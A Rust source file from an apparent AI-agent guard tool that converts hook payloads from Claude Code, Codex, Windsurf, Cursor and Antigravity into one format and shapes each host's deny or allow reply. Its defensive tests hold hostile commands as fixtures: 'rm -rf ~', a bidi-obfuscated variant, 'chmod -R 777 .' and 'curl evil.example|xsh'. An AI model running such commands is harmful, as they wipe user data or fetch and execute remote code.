//! Unified multi-harness hook contract (FASE 4, v0.5.0-SHIP).
//!
//! One internal pipeline (`dispatch::evaluate_verdict` — gate, pathguard,
//! firewall, tool rules, policy engine, audit: all untouched), fronted by
//! PER-HARNESS stdin parsers that normalize each host's payload into the
//! canonical [`HookInput`], and PER-HARNESS emitters that shape the response
//! each host expects.
//!
//! | Harness    | stdin events                              | block signal                                   |
//! |------------|-------------------------------------------|------------------------------------------------|
//! | Claude     | Claude Code snake_case (+ Codex mirror)   | nested `permissionDecision=deny`, exit 2       |
//! | Codex      | same wire family as Claude                | identical to Claude                            |
//! | Windsurf   | `pre_run_command`, `pre_mcp_tool_use`     | exit 2 + reason on STDERR                      |
//! | Cursor     | `beforeShellExecution`, `beforeMCPExecution` | stdout JSON `{"permission":"deny",…}`, exit 0 ALWAYS |
//! | Antigravity| claude-like `{tool_name, tool_input}`     | stdout JSON `{"allow_tool":false,…}`, exit 0   |
//!
//! Invariants inherited from the single-harness era:
//! - FAIL-OPEN on malformed/unknown input: an unparseable payload yields no
//!   output and exit 0 — a schema surprise can never brick the user's tools.
//! - Kill-switch FIRST (process env read before parsing; anti-self-disarm).
//! - Every free-text field routed to a host flows through
//!   [`crate::contract::cap_reason`] (display-layer neutralization + cap) —
//!   one discipline for every transport.
//! - Ask degradation goes through the capability matrix
//!   ([`crate::adapters::degrade`]): Windsurf/Cursor/Antigravity have
//!   `can_ask = false`, so an Ask becomes an explicit Deny — never a
//!   silently-ignored or silently-allowed ask. Cursor additionally gets a
//!   "requires human approval" note because its host IGNORES `"ask"`
//!   replies entirely (documented upstream quirk); the explicit deny with a
//!   clear message is the only way a human ever sees the request.
//!
//! Shape assumptions documented inline where the researched wire formats left
//! room for interpretation; everything is parsed defensively (optional fields,
//! unknown keys ignored) so additive host changes degrade to fail-open rather
//! than to errors.

use serde_json::{json, Value};

use crate::adapters::capabilities::{capabilities_for, degrade};
use crate::adapters::ir::{Decision, HostId};
use crate::adapters::TargetOs;
use crate::config::Config;
use crate::contract::HookInput;
use crate::verdict::{Tier, Verdict};

use super::dispatch::evaluate_verdict;

/// The supported harnesses (`agentguard hook --harness <name>`). The default
/// (`claude`) keeps the pre-multi-harness behavior byte-identical.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Harness {
    /// Claude Code — the CANONICAL subprocess envelope (default).
    Claude,
    /// OpenAI Codex — mirrors Claude's snake_case wire format.
    Codex,
    /// Windsurf — `pre_run_command` / `pre_mcp_tool_use`.
    Windsurf,
    /// Cursor — `beforeShellExecution` / `beforeMCPExecution`.
    Cursor,
    /// Antigravity CLI plugin — claude-like PreToolUse.
    Antigravity,
}

/// `(CLI name, variant)` table — the single naming source for `--harness`.
pub const NAMES: &[(&str, Harness)] = &[
    ("claude", Harness::Claude),
    ("codex", Harness::Codex),
    ("windsurf", Harness::Windsurf),
    ("cursor", Harness::Cursor),
    ("antigravity", Harness::Antigravity),
];

impl Harness {
    /// Parse a `--harness` CLI value. Unknown names yield `None` (the CLI
    /// layer rejects them via its value enum; this seam exists for lib users
    /// and tests).
    pub fn from_name(name: &str) -> Option<Harness> {
        NAMES.iter().find(|(n, _)| *n == name).map(|(_, h)| *h)
    }

    /// Capability-matrix row backing this harness's emission decisions.
    fn host(self) -> HostId {
        match self {
            Harness::Claude => HostId::ClaudeCode,
            Harness::Codex => HostId::Codex,
            Harness::Windsurf => HostId::Windsurf,
            Harness::Cursor => HostId::Cursor,
            Harness::Antigravity => HostId::Antigravity,
        }
    }

    /// Normalize this harness's raw stdin JSON into the internal
    /// [`HookInput`]. `None` ⇒ fail open (no output, exit 0).
    pub fn parse(self, raw: &str) -> Option<HookInput> {
        match self {
            // Claude/Codex payloads ARE the canonical envelope; the tolerant
            // serde contract already handles them (and their aliases/extras).
            Harness::Claude | Harness::Codex | Harness::Antigravity => {
                serde_json::from_str(raw).ok()
            }
            Harness::Windsurf => parse_windsurf(raw),
            Harness::Cursor => parse_cursor(raw),
        }
    }

    /// Shape a [`Verdict`] into this harness's native response.
    pub fn emit(self, verdict: &Verdict) -> Emission {
        // LOAD-BEARING: route through the capability matrix + degrade() first
        // (same choke point as the subprocess adapters) so a non-ask host can
        // never receive an Ask-shaped outcome.
        let decision = degrade(
            to_decision(verdict),
            &capabilities_for(self.host(), target_os()),
        );
        match self {
            Harness::Claude | Harness::Codex => {
                // Delegated paths never reach here through `run`; if a caller
                // invokes `emit` directly, produce the canonical Claude shape.
                let event = "PreToolUse";
                let (stdout, exit) = crate::contract::emit(event, verdict);
                let stderr = (exit == 2).then(|| stdout.clone()).flatten();
                Emission {
                    stdout,
                    stderr,
                    exit,
                }
            }
            Harness::Windsurf => emit_windsurf(&decision),
            Harness::Cursor => emit_cursor(verdict.tier == Tier::Ask, &decision),
            Harness::Antigravity => emit_antigravity(&decision),
        }
    }
}

/// What one hook invocation emits back to its harness.
///
/// `stdout`/`stderr` are printed verbatim by the CLI wrapper; `exit` becomes
/// the process exit code. All three are empty/0 on the allow path.
#[derive(Debug, Clone, PartialEq)]
pub struct Emission {
    pub stdout: Option<String>,
    pub stderr: Option<String>,
    pub exit: i32,
}

impl Emission {
    /// The fail-open / kill-switch emission: nothing said, exit 0.
    fn none() -> Emission {
        Emission {
            stdout: None,
            stderr: None,
            exit: 0,
        }
    }
}

/// Run the hook for `harness` against raw stdin JSON and a config.
///
/// Claude/Codex delegate to the untouched single-harness entry point
/// ([`super::run`]) so the default path stays BYTE-IDENTICAL; the other
/// harnesses parse → dispatch (shared core) → emit. Ordering matches the
/// canonical path: kill-switch first, then parse (fail-open), then dispatch.
pub fn run(harness: Harness, stdin_json: &str, config: &Config) -> Emission {
    match harness {
        Harness::Claude | Harness::Codex => {
            let (out, code) = super::run(stdin_json, config);
            // Belt-and-suspenders parity with the historical CLI behavior:
            // on a blocking exit the decision JSON is mirrored to stderr.
            let stderr = if code == 2 { out.clone() } else { None };
            Emission {
                stdout: out,
                stderr,
                exit: code,
            }
        }
        h => {
            // KILL-SWITCH FIRST — before any parsing or evaluation (same
            // ordering as the Claude path).
            if super::dispatch::kill_switch_engaged(config) {
                return Emission::none();
            }
            // Fail OPEN: unknown/malformed payload must not block the tool.
            let Some(input) = h.parse(stdin_json) else {
                return Emission::none();
            };
            let verdict =
                evaluate_verdict(&input, config, &crate::firewall::refetch::UreqSource::new());
            h.emit(&verdict)
        }
    }
}

// ---------------------------------------------------------------------------
// Parsers (harness stdin → HookInput)
// ---------------------------------------------------------------------------

/// Windsurf normalization.
///
/// - `pre_run_command` + string `command` → Bash-equivalent (the gate
///   evaluates it exactly like a Claude Bash call).
/// - `pre_mcp_tool_use` + `tool_name`/`args`: when `args` carries a string
///   `command` the call maps to a Bash-equivalent (gate applies); otherwise
///   the raw tool name is preserved so the dispatcher fails open (allow).
/// - Anything else (unknown event, missing fields) ⇒ `None` ⇒ fail open.
fn parse_windsurf(raw: &str) -> Option<HookInput> {
    let v: Value = serde_json::from_str(raw).ok()?;
    match v.get("hook_event_name").and_then(Value::as_str)? {
        "pre_run_command" => {
            let cmd = v.get("command").and_then(Value::as_str)?;
            Some(HookInput {
                hook_event_name: "PreToolUse".to_string(),
                session_id: opt_session(&v),
                tool_name: Some("Bash".to_string()),
                tool_input: json!({ "command": cmd }),
                ..HookInput::default()
            })
        }
        "pre_mcp_tool_use" => {
            let tool = v.get("tool_name").and_then(Value::as_str)?;
            let args = v.get("args").cloned().unwrap_or_else(|| json!({}));
            Some(mcp_like_input(&v, tool, args))
        }
        _ => None,
    }
}

/// Cursor normalization.
///
/// - `beforeShellExecution` payload: a top-level string `command` →
///   Bash-equivalent (gate applies).
/// - `beforeMCPExecution` payload: `tool_name` + `args` object, mapped like
///   the Windsurf MCP event (a string `args.command` upgrades the call to a
///   Bash-equivalent; anything else fails open under the raw tool name).
/// - Both event kinds may carry extra host fields — ignored by construction.
fn parse_cursor(raw: &str) -> Option<HookInput> {
    let v: Value = serde_json::from_str(raw).ok()?;
    // The documented payloads carry no event-name field, so dispatching is
    // BY SHAPE — but if an event name IS present and unknown, fail open
    // rather than gating a future/undocumented surface.
    if let Some(ev) = v.get("hook_event_name").and_then(Value::as_str) {
        match ev {
            "beforeShellExecution" | "beforeMCPExecution" => {}
            _ => return None,
        }
    }
    if let Some(cmd) = v.get("command").and_then(Value::as_str) {
        return Some(HookInput {
            hook_event_name: "PreToolUse".to_string(),
            session_id: opt_session(&v),
            tool_name: Some("Bash".to_string()),
            tool_input: json!({ "command": cmd }),
            ..HookInput::default()
        });
    }
    let tool = v.get("tool_name").and_then(Value::as_str)?;
    let args = v.get("args").cloned().unwrap_or_else(|| json!({}));
    Some(mcp_like_input(&v, tool, args))
}

/// Shared MCP-call normalization (windsurf `pre_mcp_tool_use`, cursor
/// `beforeMCPExecution`): a string `command` inside the args object makes the
/// call Bash-like (gated); any other shape keeps the RAW tool name so the
/// dispatcher's `_` arm fails open.
fn mcp_like_input(carrier: &Value, tool: &str, args: Value) -> HookInput {
    let bash_like = args.get("command").and_then(Value::as_str).is_some();
    HookInput {
        hook_event_name: "PreToolUse".to_string(),
        session_id: opt_session(carrier),
        tool_name: Some(if bash_like {
            "Bash".to_string()
        } else {
            tool.to_string()
        }),
        tool_input: args,
        ..HookInput::default()
    }
}

/// Best-effort session id off either spelling (used for canary keying when a
/// host provides it; absent on most non-Claude payloads).
fn opt_session(v: &Value) -> Option<String> {
    v.get("session_id")
        .or_else(|| v.get("sessionId"))
        .and_then(Value::as_str)
        .map(str::to_string)
}

// ---------------------------------------------------------------------------
// Emitters (Verdict → per-harness response)
// ---------------------------------------------------------------------------

/// Map the hook-pipeline [`Verdict`] onto the adapter-layer [`Decision`] IR so
/// the shared degrade() rule applies. `rule_id` stays `None` here: the hook
/// pipeline encodes provenance in the reason text (see `audit_decision`),
/// not as a structured field.
fn to_decision(v: &Verdict) -> Decision {
    match v.tier {
        Tier::Allow => Decision::Allow,
        Tier::Warn => Decision::Warn {
            reason: v.reason.clone(),
        },
        Tier::Ask => Decision::Ask {
            reason: v.reason.clone(),
        },
        Tier::Block => Decision::Deny {
            reason: v.reason.clone(),
            rule_id: None,
        },
    }
}

/// Compile-time target OS for the capability lookup (this binary runs ON the
/// host machine next to the harness).
fn target_os() -> TargetOs {
    #[cfg(target_os = "linux")]
    {
        TargetOs::Linux
    }
    #[cfg(target_os = "macos")]
    {
        TargetOs::MacOS
    }
    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
    {
        TargetOs::Windows
    }
}

/// Windsurf emission: stderr IS the channel the host reads.
///
/// - Allow  → silent, exit 0.
/// - Warn   → reason on stderr, exit 0 (ASSUMPTION: stderr text at exit 0 is
///   surfaced as information by the host but never blocks; the exit code is
///   the enforcement signal).
/// - Deny (incl. degraded Ask) → reason on stderr + exit 2.
/// - Rewrite cannot occur from the hook pipeline; defensively fail closed.
fn emit_windsurf(decision: &Decision) -> Emission {
    match decision {
        Decision::Allow => Emission::none(),
        Decision::Warn { reason } => Emission {
            stdout: None,
            stderr: Some(crate::contract::cap_reason(reason)),
            exit: 0,
        },
        Decision::Ask { reason, .. } => {
            // Defensive: degrade() maps Ask to Deny on this can_ask=false host,
            // so this arm should be dead. Render it as a hard deny instead of
            // panicking — a hook panic exits 101, which no host reads as a
            // block signal (that would fail open by accident).
            Emission {
                stdout: None,
                stderr: Some(crate::contract::cap_reason(reason)),
                exit: 2,
            }
        }
        Decision::Deny { reason, .. } => Emission {
            stdout: None,
            stderr: Some(crate::contract::cap_reason(reason)),
            exit: 2,
        },
        Decision::Rewrite { reason, .. } => Emission {
            stdout: None,
            stderr: Some(crate::contract::cap_reason(reason)),
            exit: 2,
        },
    }
}

/// Cursor emission: the verdict lives in the stdout JSON body; exit 0 ALWAYS
/// (a non-zero exit reads as a hook crash, not a deny).
///
/// - Allow  → no output (absence permits).
/// - Warn   → silent allow (no structured warn channel; mirrors the
///   `can_add_context=false` handling in `format_decision_core`).
/// - Deny   → `{"permission":"deny","user_message":<reason>}`.
/// - Ask    → DEGRADED to deny before this function (can_ask=false); the
///   original Ask origin adds the explicit "requires human approval" note,
///   because the host ignores "ask" replies outright.
fn emit_cursor(was_ask: bool, decision: &Decision) -> Emission {
    match decision {
        Decision::Allow => Emission::none(),
        Decision::Warn { .. } => Emission::none(),
        Decision::Ask { reason, .. } => {
            // Defensive mirror of the Deny arm (with approval note): degrade()
            // makes this dead on a can_ask=false host, but a panic here would
            // exit 101 — which no host reads as a block (fail-open by accident).
            let composed = format!("{reason} (blocked pending human approval)");
            Emission {
                stdout: Some(
                    json!({ "permission": "deny", "user_message": crate::contract::cap_reason(&composed) })
                        .to_string(),
                ),
                stderr: None,
                exit: 0,
            }
        }
        Decision::Deny { reason, .. } => {
            // Compose BEFORE capping so the approval note can never push the
            // payload past MAX_CONTEXT_BYTES (cap_reason is the single
            // neutralize+cap choke point).
            let composed = if was_ask {
                format!("{reason} (blocked pending human approval)")
            } else {
                reason.clone()
            };
            Emission {
                stdout: Some(
                    json!({ "permission": "deny", "user_message": crate::contract::cap_reason(&composed) })
                        .to_string(),
                ),
                stderr: None,
                exit: 0,
            }
        }
        Decision::Rewrite { reason, .. } => {
            // Fail-closed fallback: never execute the ORIGINAL input when a
            // rewrite verdict reached a transport that cannot rewrite.
            Emission {
                stdout: Some(
                    json!({
                        "permission": "deny",
                        "user_message": crate::contract::cap_reason(reason),
                    })
                    .to_string(),
                ),
                stderr: None,
                exit: 0,
            }
        }
    }
}

/// Antigravity emission (plugin drop-in, claude-like PreToolUse):
/// - Allow / Warn → NO deny fields (no output at all; absence permits).
/// - Deny (incl. degraded Ask) → `{"allow_tool": false, "deny_reason": …}`
///   with exit 0 — the host treats a non-zero exit as a HOOK failure.
/// - Rewrite cannot occur; defensively denied through the same JSON body.
fn emit_antigravity(decision: &Decision) -> Emission {
    match decision {
        Decision::Allow => Emission::none(),
        Decision::Warn { .. } => Emission::none(),
        Decision::Ask { reason, .. } => {
            // Defensive mirror of the Deny arm: degrade() makes this dead on a
            // can_ask=false host; render hard-deny instead of panicking (exit
            // 101 reads as hook failure = fail-open by accident).
            Emission {
                stdout: Some(
                    json!({
                        "allow_tool": false,
                        "deny_reason": crate::contract::cap_reason(reason),
                    })
                    .to_string(),
                ),
                stderr: None,
                exit: 0,
            }
        }
        Decision::Deny { reason, .. } | Decision::Rewrite { reason, .. } => Emission {
            stdout: Some(
                json!({
                    "allow_tool": false,
                    "deny_reason": crate::contract::cap_reason(reason),
                })
                .to_string(),
            ),
            stderr: None,
            exit: 0,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::adapters::ir::HostId;
    use crate::verdict::Verdict;

    const BLOCK_REASON: &str = "destructive [rm-rf]";

    fn block() -> Verdict {
        Verdict::block(BLOCK_REASON)
    }

    // ---- name table -------------------------------------------------------

    #[test]
    fn from_name_roundtrips_every_entry_and_rejects_unknown() {
        for (name, h) in NAMES {
            assert_eq!(Harness::from_name(name), Some(*h), "{name}");
        }
        assert_eq!(Harness::from_name("vscode"), None);
        assert_eq!(Harness::from_name(""), None);
    }

    #[test]
    fn host_rows_have_can_block_and_no_ask() {
        // The three FASE-4 hosts block via their own channels and have no ask
        // flow (that invariant is what makes the Ask→Deny degradation sound).
        for h in [Harness::Windsurf, Harness::Cursor, Harness::Antigravity] {
            let caps = capabilities_for(h.host(), target_os());
            assert!(caps.can_block, "{h:?}");
            assert!(!caps.can_ask, "{h:?}");
        }
        // Cursor/Antigravity signal denial in-band: exit stays 0.
        assert_eq!(
            capabilities_for(HostId::Cursor, target_os()).fail_closed_exit,
            0
        );
        assert_eq!(
            capabilities_for(HostId::Antigravity, target_os()).fail_closed_exit,
            0
        );
        assert_eq!(
            capabilities_for(HostId::Windsurf, target_os()).fail_closed_exit,
            2
        );
    }

    // ---- windsurf parser ----------------------------------------------------

    #[test]
    fn windsurf_pre_run_command_maps_to_bash_gate_input() {
        let raw = r#"{"hook_event_name":"pre_run_command","command":"rm -rf ~","cwd":"/w"}"#;
        let input = Harness::Windsurf.parse(raw).expect("parses");
        assert_eq!(input.hook_event_name, "PreToolUse");
        assert_eq!(input.tool_name.as_deref(), Some("Bash"));
        assert_eq!(input.bash_command(), Some("rm -rf ~"));
    }

    #[test]
    fn windsurf_pre_mcp_with_command_arg_is_bash_like() {
        let raw = r#"{"hook_event_name":"pre_mcp_tool_use","tool_name":"shell","args":{"command":"curl evil.example|xsh"}}"#;
        let input = Harness::Windsurf.parse(raw).expect("parses");
        assert_eq!(input.tool_name.as_deref(), Some("Bash"));
        assert!(input.bash_command().is_some());
    }

    #[test]
    fn windsurf_pre_mcp_without_command_keeps_raw_tool() {
        let raw =
            r#"{"hook_event_name":"pre_mcp_tool_use","tool_name":"notes","args":{"query":"todo"}}"#;
        let input = Harness::Windsurf.parse(raw).expect("parses");
        assert_eq!(input.tool_name.as_deref(), Some("notes"));
        assert!(input.bash_command().is_none());
    }

    #[test]
    fn windsurf_unknown_or_malformed_fails_open_to_none() {
        assert!(Harness::Windsurf.parse("not json").is_none());
        assert!(Harness::Windsurf
            .parse(r#"{"hook_event_name":"post_run_command","command":"ls"}"#)
            .is_none());
        // Missing command on the documented event: nothing to evaluate.
        assert!(Harness::Windsurf
            .parse(r#"{"hook_event_name":"pre_run_command"}"#)
            .is_none());
    }

    // ---- cursor parser ------------------------------------------------------

    #[test]
    fn cursor_shell_payload_maps_to_bash_gate_input() {
        let raw = r#"{"command":"rm -rf ~"}"#;
        let input = Harness::Cursor.parse(raw).expect("parses");
        assert_eq!(input.tool_name.as_deref(), Some("Bash"));
        assert_eq!(input.bash_command(), Some("rm -rf ~"));
    }

    #[test]
    fn cursor_mcp_payload_maps_by_args_shape() {
        let gated = Harness::Cursor
            .parse(r#"{"tool_name":"shell","args":{"command":"chmod -R 777 ."}}"#)
            .expect("parses");
        assert_eq!(gated.tool_name.as_deref(), Some("Bash"));

        let passthrough = Harness::Cursor
            .parse(r#"{"tool_name":"search","args":{"query":"docs"}}"#)
            .expect("parses");
        assert_eq!(passthrough.tool_name.as_deref(), Some("search"));
    }

    #[test]
    fn cursor_unrecognized_fails_open_to_none() {
        assert!(Harness::Cursor.parse("{}").is_none());
        assert!(Harness::Cursor.parse(r#"{"tool_name":42}"#).is_none());
    }

    // ---- antigravity parser ---------------------------------------------------

    #[test]
    fn antigravity_claude_like_payload_passes_through() {
        let raw = r#"{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git push --force"}}"#;
        let input = Harness::Antigravity.parse(raw).expect("parses");
        assert_eq!(input.bash_command(), Some("git push --force"));
    }

    // ---- windsurf emitter -----------------------------------------------------

    #[test]
    fn windsurf_block_is_stderr_reason_exit_2() {
        let em = Harness::Windsurf.emit(&block());
        assert_eq!(em.exit, 2);
        assert!(em.stdout.is_none());
        let err = em.stderr.expect("stderr carries the reason");
        assert!(err.contains(BLOCK_REASON), "{err}");
    }

    #[test]
    fn windsurf_allow_is_silent_exit_0() {
        let em = Harness::Windsurf.emit(&Verdict::allow());
        assert_eq!(em.exit, 0);
        assert_eq!(em, Emission::none());
    }

    #[test]
    fn windsurf_warn_is_stderr_exit_0() {
        let em = Harness::Windsurf.emit(&Verdict::warn("ambiguous"));
        assert_eq!(em.exit, 0);
        assert_eq!(em.stderr.as_deref(), Some("ambiguous"));
        assert!(em.stdout.is_none());
    }

    #[test]
    fn windsurf_ask_degrades_to_deny_exit_2() {
        let em = Harness::Windsurf.emit(&Verdict::ask("needs review"));
        assert_eq!(em.exit, 2, "no ask channel: ask degrades to a hard deny");
        assert!(em
            .stderr
            .as_deref()
            .is_some_and(|s| s.contains("needs review")));
    }

    // ---- cursor emitter ---------------------------------------------------------

    #[test]
    fn cursor_block_is_deny_json_exit_0() {
        let em = Harness::Cursor.emit(&block());
        assert_eq!(em.exit, 0, "cursor exit codes are NOT the block signal");
        assert!(em.stderr.is_none());
        let v: Value = serde_json::from_str(&em.stdout.expect("deny json")).unwrap();
        assert_eq!(v["permission"], "deny");
        assert_eq!(v["user_message"], BLOCK_REASON);
    }

    #[test]
    fn cursor_allow_and_warn_are_silent_exit_0() {
        assert_eq!(Harness::Cursor.emit(&Verdict::allow()), Emission::none());
        assert_eq!(
            Harness::Cursor.emit(&Verdict::warn("meh")),
            Emission::none()
        );
    }

    #[test]
    fn cursor_ask_maps_to_explicit_deny_with_human_approval_note() {
        // Documented host quirk: an "ask" reply is IGNORED upstream. The only
        // honest mapping is an explicit deny whose message says a human must
        // approve — the ask must never degrade to silence.
        let em = Harness::Cursor.emit(&Verdict::ask("policy wants confirmation"));
        assert_eq!(em.exit, 0);
        let v: Value = serde_json::from_str(&em.stdout.expect("deny json")).unwrap();
        assert_eq!(v["permission"], "deny");
        let msg = v["user_message"].as_str().expect("message");
        assert!(msg.contains("human approval"), "{msg}");
        assert!(msg.contains("policy wants confirmation"), "{msg}");
    }

    // ---- antigravity emitter ------------------------------------------------------

    #[test]
    fn antigravity_block_is_allow_tool_false_exit_0() {
        let em = Harness::Antigravity.emit(&block());
        assert_eq!(em.exit, 0, "non-zero exits read as HOOK failure there");
        assert!(em.stderr.is_none(), "its channel is the JSON body");
        let v: Value = serde_json::from_str(&em.stdout.expect("deny json")).unwrap();
        assert_eq!(v["allow_tool"], false);
        assert_eq!(v["deny_reason"], BLOCK_REASON);
    }

    #[test]
    fn antigravity_allow_and_warn_emit_no_deny_fields() {
        assert_eq!(
            Harness::Antigravity.emit(&Verdict::allow()),
            Emission::none()
        );
        assert_eq!(
            Harness::Antigravity.emit(&Verdict::warn("fyi")),
            Emission::none()
        );
    }

    #[test]
    fn antigravity_ask_degrades_to_deny_exit_0() {
        let em = Harness::Antigravity.emit(&Verdict::ask("confirm?"));
        assert_eq!(em.exit, 0);
        let v: Value = serde_json::from_str(&em.stdout.expect("deny json")).unwrap();
        assert_eq!(v["allow_tool"], false);
        assert_eq!(v["deny_reason"], "confirm?");
    }

    // ---- shared free-text discipline ------------------------------------------

    #[test]
    fn every_harness_reason_is_capped_at_max_context_bytes() {
        let huge = Verdict::block("x".repeat(crate::contract::MAX_CONTEXT_BYTES * 3));
        for h in [Harness::Windsurf, Harness::Cursor, Harness::Antigravity] {
            let em = h.emit(&huge);
            let texts = em.stderr.into_iter().chain(em.stdout);
            for t in texts {
                assert!(
                    t.len() <= crate::contract::MAX_CONTEXT_BYTES + 128,
                    "{h:?}: emitted payload over cap: {} bytes",
                    t.len()
                );
                // JSON-wrapped payloads end in `}`; assert on containment.
                assert!(
                    t.ends_with('…') || t.contains('…'),
                    "{h:?}: truncation marker expected"
                );
            }
        }
    }

    #[test]
    fn reasons_are_neutralized_before_emission() {
        // Hidden bidi control in a blocked command must surface as the visible
        // escape placeholder, never the raw codepoint (same display-layer
        // discipline as the Claude emitter).
        let cmd = "rm\u{202b} -rf ~";
        let v = Verdict::block(format!("blocked `{cmd}`"));
        for h in [Harness::Windsurf, Harness::Cursor, Harness::Antigravity] {
            let em = h.emit(&v);
            let joined = format!(
                "{}{}",
                em.stdout.unwrap_or_default(),
                em.stderr.unwrap_or_default()
            );
            assert!(!joined.contains('\u{202b}'), "{h:?}: raw control survived");
            assert!(joined.contains("\\u{202b}"), "{h:?}: placeholder expected");
        }
    }

    // ---- claude/codex delegation identity ----------------------------------------

    #[test]
    fn claude_and_codex_delegate_matches_canonical_hook_run() {
        let cfg = Config::default();
        for payload in [
            r#"{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"rm -rf ~"}}"#,
            r#"{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls -la"}}"#,
            "garbage-not-json",
        ] {
            let expected = super::super::run(payload, &cfg);
            for h in [Harness::Claude, Harness::Codex] {
                let em = run(h, payload, &cfg);
                let (out, code) = (em.stdout, em.exit);
                assert_eq!(code, expected.1, "{h:?} exit drift on {payload}");
                assert_eq!(out, expected.0, "{h:?} stdout drift on {payload}");
                // Block mirrors the JSON to stderr (historical belt-and-suspenders).
                if code == 2 {
                    assert_eq!(em.stderr, expected.0, "{h:?}: stderr mirror");
                } else {
                    assert_eq!(em.stderr, None, "{h:?}: no stray stderr");
                }
            }
        }
    }

    #[test]
    fn config_kill_switch_disables_non_claude_harnesses() {
        // Config-level kill switch short-circuits BEFORE parsing, mirroring
        // the canonical ordering (env-var matrix covered in kill_switch_env).
        let cfg = Config {
            disable: true,
            ..Config::default()
        };
        for h in [
            Harness::Claude,
            Harness::Windsurf,
            Harness::Cursor,
            Harness::Antigravity,
        ] {
            let em = run(
                h,
                r#"{"hook_event_name":"pre_run_command","command":"rm -rf ~"}"#,
                &cfg,
            );
            assert_eq!(em, Emission::none(), "{h:?}");
        }
    }

    // ---- end-to-end through run() (parser + dispatch + emitter) -------------------

    #[test]
    fn windsurf_run_blocks_dangerous_command_via_stderr_exit_2() {
        let cfg = Config::default();
        let em = run(
            Harness::Windsurf,
            r#"{"hook_event_name":"pre_run_command","command":"rm -rf ~"}"#,
            &cfg,
        );
        assert_eq!(em.exit, 2);
        assert!(em.stdout.is_none());
        assert!(em.stderr.is_some_and(|s| !s.is_empty()));
    }

    #[test]
    fn cursor_run_blocks_dangerous_command_via_json_body_exit_0() {
        let cfg = Config::default();
        let em = run(Harness::Cursor, r#"{"command":"rm -rf ~"}"#, &cfg);
        assert_eq!(em.exit, 0);
        let v: Value = serde_json::from_str(&em.stdout.expect("deny json")).unwrap();
        assert_eq!(v["permission"], "deny");
    }

    #[test]
    fn antigravity_run_allows_benign_command_silently() {
        let cfg = Config::default();
        let em = run(
            Harness::Antigravity,
            r#"{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls -la"}}"#,
            &cfg,
        );
        assert_eq!(em, Emission::none());
    }

    #[test]
    fn mcp_calls_without_commands_fail_open_through_the_full_pipeline() {
        let cfg = Config::default();
        for (h, payload) in [
            (
                Harness::Windsurf,
                r#"{"hook_event_name":"pre_mcp_tool_use","tool_name":"notes","args":{"query":"x"}}"#,
            ),
            (
                Harness::Cursor,
                r#"{"tool_name":"search","args":{"query":"x"}}"#,
            ),
        ] {
            let em = run(h, payload, &cfg);
            assert_eq!(em, Emission::none(), "{h:?}: ungated MCP call allows");
        }
    }
}
